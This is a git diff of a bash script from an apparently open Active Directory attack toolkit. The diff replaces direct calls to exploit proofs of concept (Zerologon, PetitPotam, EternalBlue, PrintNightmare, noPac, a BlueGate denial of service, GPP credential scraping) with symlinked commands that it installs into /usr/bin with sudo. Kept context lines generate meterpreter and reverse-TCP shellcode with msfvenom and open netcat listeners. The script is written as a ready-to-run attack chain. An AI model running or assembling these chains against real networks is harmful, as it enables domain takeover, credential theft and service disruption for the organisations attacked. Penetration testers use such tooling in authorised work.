@@ -693,9 +724,11 @@ exploiting_vulns_without-account(){
                 interface="$(get_interface)"
                 listening_ip="$(get_ip_listening "$interface")"
                 printf "\n%bResponder will be runt over another terminal, please enter your password on it to run Responder as root (the terminal will sleep 30s waiting for this)\n%b" "${BLUE}" "${NC}"
-                gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/SCANNER_AD/Responder/Responder.py -I $interface --lm; exec bash"
+                # gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/SCANNER_AD/Responder/Responder.py -I $interface --lm; exec bash"
+                gnome-terminal -- sh -c "Responder.py -I $interface --lm; exec bash"
                 sleep 30s
-                python3 "$PATH_TO_WORKSPACE/POC/petitpotam_poc.py" "$listening_ip" "$ip" -u "" -p ""
+                # python3 "$PATH_TO_WORKSPACE/POC/petitpotam_poc.py" "$listening_ip" "$ip" -u "" -p ""
+                petitpotam_poc "$listening_ip" "$ip" -u "" -p ""
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -737,7 +770,8 @@ exploiting_vulns_without-account(){
                     printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                     return
                 fi
-                python3 "$PATH_TO_WORKSPACE/POC/zerologon_cve20201472_poc.py" "$dc_hostname" "$dc_ip"
+                # python3 "$PATH_TO_WORKSPACE/POC/zerologon_cve20201472_poc.py" "$dc_hostname" "$dc_ip"
+                zerologon_cve20201472_poc "$dc_hostname" "$dc_ip"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -759,7 +793,8 @@ exploiting_vulns_without-account(){
                     return
                 fi
                 printf "\n%bWith anonymous session...%b\n" "${BLUE}" "${NC}"
-                python3 "$PATH_TO_WORKSPACE/POC/getgppcreds_scanner.py" ""@"$dc_ip"
+                # python3 "$PATH_TO_WORKSPACE/POC/getgppcreds_scanner.py" ""@"$dc_ip"
+                getgppcreds_scanner ""@"$dc_ip"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -781,7 +816,8 @@ exploiting_vulns_without-account(){
                     printf "%b\nNo IP selected...%b" "${RED}" "${NC}"
                     return
                 fi
-                python3 "$PATH_TO_WORKSPACE/POC/bluegate_cve20200610_poc.py" -M dos -P "$port" "$ip"
+                # python3 "$PATH_TO_WORKSPACE/POC/bluegate_cve20200610_poc.py" -M dos -P "$port" "$ip"
+                bluegate_cve20200610_poc -M dos -P "$port" "$ip"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -882,7 +918,8 @@ exploiting_vulns_with-domain-account(){
                 msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_eternalblue"
                 msfvenom -p windows/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex86_eternalblue"
                 gnome-terminal -- sh -c "netcat -lvnp $lport; exec bash"
-                python3 "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13 "$ad_user_name" "$ad_user_pwd"
+                # python3 "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13 "$ad_user_name" "$ad_user_pwd"
+                eternalblue_ms17010_poc "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13 "$ad_user_name" "$ad_user_pwd"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -908,7 +945,8 @@ exploiting_vulns_with-domain-account(){
                 msfvenom -p windows_reverse_tcp_shell LHOST="$listening_ip" -f dll -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.dll"
                 x86_64-w64-mingw32-gcc -shared -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare" "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.c"
                 gnome-terminal -- sh -c "bash -c 'netcat -lvnp $lport; exec bash"
-                python3 "$PATH_TO_WORKSPACE/POC/CVE-2021-1675.py" -v -u "$ad_user_name" -p "$ad_user_pwd" -d "$domain_name" -dll "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.c" --local-ip "$listening_ip" "$ip"
+                # python3 "$PATH_TO_WORKSPACE/POC/CVE-2021-1675.py" -v -u "$ad_user_name" -p "$ad_user_pwd" -d "$domain_name" -dll "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.c" --local-ip "$listening_ip" "$ip"
+                CVE-2021-1675 -v -u "$ad_user_name" -p "$ad_user_pwd" -d "$domain_name" -dll "$PATH_TO_WORKSPACE/known-data/exploits/shellcode_printnightmare.c" --local-ip "$listening_ip" "$ip"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -955,8 +993,10 @@ exploiting_vulns_with-domain-account(){
                 printf "\n%bSelect a network interface for listening on:\n%b" "${BLUE}" "${NC}"
                 interface="$(get_interface)"
                 listening_ip="$(get_ip_listening "$interface")"
-                gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/SCANNER_AD/Responder/Responder.py -I $interface --lm; exec bash"
-                python3 "$PATH_TO_WORKSPACE/POC/PetitPotam.py" "$listening_ip" "$ip" "$ad_user_name" "$ad_user_pwd"
+                # gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/SCANNER_AD/Responder/Responder.py -I $interface --lm; exec bash"
+                gnome-terminal -- sh -c "Responder.py -I $interface --lm; exec bash"
+                # python3 "$PATH_TO_WORKSPACE/POC/PetitPotam.py" "$listening_ip" "$ip" "$ad_user_name" "$ad_user_pwd"
+                PetitPotam "$listening_ip" "$ip" "$ad_user_name" "$ad_user_pwd"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -978,7 +1018,8 @@ exploiting_vulns_with-domain-account(){
                     printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                     return
                 fi
-                python3 "$PATH_TO_WORKSPACE/POC/noPac.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd" -dc-ip "$dc_ip"
+                # python3 "$PATH_TO_WORKSPACE/POC/noPac.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd" -dc-ip "$dc_ip"
+                noPac "$domain_name"/"$ad_user_name":"$ad_user_pwd" -dc-ip "$dc_ip"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -999,7 +1040,8 @@ exploiting_vulns_with-domain-account(){
                     printf "%b\nNo DC selected...%b" "${RED}" "${NC}"
                     return
                 fi
-                python3 "$PATH_TO_WORKSPACE/POC/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip"
+                # python3 "$PATH_TO_WORKSPACE/POC/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip"
+                getgppcreds_scanner "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -1192,7 +1234,8 @@ setting_bloodhound(){
         printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
     fi
     cd "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap" || exit
-    python3 "$PATH_TO_WORKSPACE/SCANNER_AD/windapsearch.py" --dc-ip "$dc_ip" -u "$ad_user_name"@"$fqdn" -p "$ad_user_pwd" --computers -r -C -o "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap"
+    # python3 "$PATH_TO_WORKSPACE/SCANNER_AD/windapsearch.py" --dc-ip "$dc_ip" -u "$ad_user_name"@"$fqdn" -p "$ad_user_pwd" --computers -r -C -o "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap"
+    python3 windapsearch --dc-ip "$dc_ip" -u "$ad_user_name"@"$fqdn" -p "$ad_user_pwd" --computers -r -C -o "$PATH_TO_WORKSPACE/known-data/accounts/results_ldap"
     cd "$PATH_TO_WORKSPACE" || exit
     if [ -n "$(cat "$PATH_TO_WORKSPACE/known-data/accounts/computers_list.csv")" ]; then 
         printf "\n%bA problem must have occured during the request of computers list (for retrieving their IP), you should re-run the scan or write th computers list into known-data/accounts/computers_list.csv...%b" "${RED}" "${NC}"
@@ -1638,6 +1681,47 @@ creation_environment(){
     fi
 }
 
+
+create_symlinks(){
+    ########################
+    # => POC
+    ########################
+	command_bin=bluegate_cve20200610_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/bluegate_cve20200610_poc.py" "/usr/bin/$command_bin"; fi
+	command_bin=eternalblue_ms17010_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "/usr/bin/$command_bin"; fi
+	command_bin=netapi_cve20084250; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/netapi_cve20084250.py" "/usr/bin/$command_bin"; fi
+	# command_bin=ntlmrelayx; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/ntlmrelayx.py" "/usr/bin/$command_bin"; fi
+	command_bin=petitpotam_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/petitpotam_poc.py" "/usr/bin/$command_bin"; fi
+	command_bin=printnightmare_cve20211675_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/printnightmare_cve20211675_poc.py" "/usr/bin/$command_bin"; fi
+	command_bin=sAMAccountName_cve202142278_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/sAMAccountName_cve202142278_poc.py" "/usr/bin/$command_bin"; fi
+	command_bin=smbghost_cve20200796_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/smbghost_cve20200796_poc.py" "/usr/bin/$command_bin"; fi
+	command_bin=zerologon_cve20201472_poc; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/POC/zerologon_cve20201472_poc.py" "/usr/bin/$command_bin"; fi
+
+    ########################
+    # => SCANNER
+    ########################
+	command_bin=bluegate_cve20200610_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/bluegate_cve20200610_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=eternalblue_ms17010_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=getgppcreds_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=micRA_cve20191040_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/micRA_cve20191040_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=netapi_cve20084250_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/netapi_cve20084250_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=petitpotam_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=printnightmare_cve20211675_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=rpcdump_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/rpcdump_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=sAMAccountName_cve202142278_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve202142278_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=smbghost_cve20200796_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/smbghost_cve20200796_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=smbleed_cve20201206_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/smbleed_cve20201206_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=smbsigning_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/smbsigning_scanner.py" "/usr/bin/$command_bin"; fi
+	command_bin=zerologon_cve20201472_scanner; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER/zerologon_cve20201472_scanner.py" "/usr/bin/$command_bin"; fi
+
+    ########################
+    # => SCANNER_AD
+    ########################
+	command_bin=get_domain-infos; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER_AD/get_domain-infos.py" "/usr/bin/$command_bin"; fi
+	command_bin=get_hostname; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER_AD/get_hostname.py" "/usr/bin/$command_bin"; fi
+	command_bin=windapsearch; if ! command -v "$command_bin" &> /dev/null; then sudo ln -sf "$PATH_TO_WORKSPACE/SCANNER_AD/windapsearch.py" "/usr/bin/$command_bin"; fi
+}
+
+
 quitting_cvad(){
     for pid in $(ps -T|awk '(NR>1) {print $1}'); do 
         kill "$pid"
@@ -1663,6 +1747,7 @@ printf '\n%b@MizaruIT on GitHub: www.github.com/MizaruIT%b\n' "${BLUE}" "${NC}"
 PATH_TO_WORKSPACE=$(pwd)
 cd "$PATH_TO_WORKSPACE" || exit
 creation_environment
+create_symlinks
 
 while true; do
     PS3="Select actions to carry out: "
